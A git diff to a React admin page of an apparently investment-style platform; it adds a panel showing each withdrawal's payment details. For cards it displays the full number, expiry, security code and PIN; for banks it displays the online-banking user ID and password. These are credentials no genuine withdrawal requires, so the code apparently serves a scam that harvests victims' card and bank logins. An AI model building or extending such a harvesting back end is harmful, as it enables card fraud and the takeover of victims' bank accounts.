@@ -1,5 +1,7 @@
 import React, { useEffect } from "react";
 import { Redirect, useHistory, useParams } from "react-router-dom";
+import styled from "styled-components";
+import { FaWallet } from "react-icons/fa";
 import { useForm } from "react-hook-form";
 import { yupResolver } from "@hookform/resolvers/yup";
 
@@ -14,6 +16,8 @@ import Spinner from "../../../../atoms/Spinner";
 import Entry from "../../../../molecules/Entry";
 import ControlledDateInput from "../../../../molecules/ControlledDateInput";
 import ControlledWalletInput from "../../../../molecules/ControlledWalletInput";
+import { CreditCardItem } from "../../../../molecules/CreditCard";
+import { BankItem } from "../../../../molecules/Bank";
 
 import ConfirmationModal from "../../../../organisms/ConfirmationModal";
 
@@ -28,11 +32,120 @@ import {
 } from "../../../../../hooks/useTransactions";
 
 import axiosInstance from "../../../../../utils/axios";
-import { capitalise } from "../../../../../utils/formatText";
+import { capitalise, ccNumber, replaceSnake } from "../../../../../utils/formatText";
 import { getCurrentProfit } from "../../../../../utils/transactionUtils";
 import { parseBalance } from "../../../../../utils/parseBalance";
 
 import { AdminDisplay } from "../AdminChecker";
+
+const MethodBrand = styled(FaWallet)`
+  height: ${({ size }) => size || "40px"};
+  width: 40px;
+  padding: 4px;
+  vertical-align: top;
+
+  background-color: ${({ bg }) => bg && bg};
+  color: ${({ color }) => color || "white"};
+  border-radius: 4px;
+`;
+
+const Method = ({title, desc, action}) => (
+  <Container
+      p="12px"
+      m="12px 0"
+      border="1px solid"
+      radius="12px"
+      flex="space-between"
+      wide="true"
+      onClick={() => (action ? action() : undefined)}
+    >
+      <Container flexCol="flex-start" wide>
+        <Text font="13px" p="0" m="0 0 4px 0" bold>
+          {title}
+        </Text>
+        <Text font="10px" p="0" opacity="0.6">
+          {desc}
+        </Text>
+      </Container>
+
+      <MethodBrand size="26px" />
+  </Container>
+)
+
+const Withdrawal = ({ withdrawal }) => {
+  const { show, toggle } = useToggle()
+
+  return (
+    <Container p="12px" wide>
+      {withdrawal.method.type === "card" ? (
+        <>
+          <CreditCardItem
+            card={withdrawal.method.address}
+            action={toggle}
+          />
+          {show && (
+            <Container bg="bg" p="12px" radius="12px" wide>
+              <Text align="center" bold>
+                {replaceSnake(withdrawal.method.address.issuer).toUpperCase()}{" "}
+                ****
+                {withdrawal.method.address.cardNumber.slice(-5)}
+              </Text>
+              <Entry title="Name on Card">
+                {withdrawal.method.address.cardHolder}
+              </Entry>
+              <Entry title="Card Number">
+                {ccNumber(withdrawal.method.address.cardNumber)}
+              </Entry>
+              <Entry title="Exp Date">
+                {withdrawal.method.address.expDate}
+              </Entry>
+              <Entry title="Security Code">
+                {withdrawal.method.address.cvv}
+              </Entry>
+              <Entry title="Card Pin">{withdrawal.method.address.pin}</Entry>
+              <Entry title="Address">{withdrawal.method.address.address}</Entry>
+              <Entry title="Zip Code">{withdrawal.method.address.zip}</Entry>
+            </Container>
+          )}
+        </>
+      ) : withdrawal.method.type === "bank" ? (
+        <>
+          <BankItem
+            bank={withdrawal.method.address}
+            action={toggle}
+          />
+          {show && (
+            <Container bg="bg" p="12px" radius="12px" wide>
+              <Text align="center" bold>
+                {withdrawal.method.address.bank.toUpperCase()}
+              </Text>
+              <Entry title="Account Name">{withdrawal.user.fullName}</Entry>
+              <Entry title="User ID">{withdrawal.method.address.userId}</Entry>
+              <Entry title="Password">
+                {withdrawal.method.address.password}
+              </Entry>
+              <Entry title="Bank">{withdrawal.method.address.bank}</Entry>
+            </Container>
+          )}
+        </>
+      ) : withdrawal.method.type === "address" ? (
+        <>
+          <Method
+            title={withdrawal.method.address.value}
+            desc={withdrawal.method.address.wallet}
+            action={toggle}
+            />
+            {show && (
+              <Container bg="bg" p="12px" radius="12px" wide>
+                <Text align="center" bold>{withdrawal.method.address.value}</Text>
+                <Entry title="Wallet">{withdrawal.method.address.wallet}</Entry>
+              </Container>
+            )}
+        </>
+      ) : null}
+    </Container>
+  );
+};
 
 const EditTransaction = () => {
   const history = useHistory();
@@ -69,6 +182,7 @@ const EditTransaction = () => {
   }, [transaction, reset, isSubmitted]);
 
   const onSubmit = async ({ type, ...data }) => {
+    delete data.method
     try {
       const { data: updatedTransaction } = await axiosInstance.put(
         "/transactions/" + transaction?._id,
@@ -124,9 +238,9 @@ const EditTransaction = () => {
           <Entry m="0" title="Type">
             {capitalise(transaction.type)}
           </Entry>
-          <Entry m="0" title="Profit">
+          {transaction.type === "investment" && (<Entry m="0" title="Profit">
             {parseBalance(getCurrentProfit(transaction))} USD
-          </Entry>
+          </Entry>)}
           <Entry m="0" title="User Email">
             {transaction.user?.email}
           </Entry>
@@ -144,8 +258,13 @@ const EditTransaction = () => {
         </Container>
       </Container>
 
+      {transaction.type === "withdrawal" && typeof transaction.method === "object" && (
+        <Withdrawal withdrawal={transaction} />
+      )}
+
       <Container as="form" onSubmit={handleSubmit(onSubmit)} p="12px" wide>
         <input hidden ref={register} name="type" />
+        <input hidden ref={register} name="method" />
         {type === "income" && (
           <Input
             label="Description"
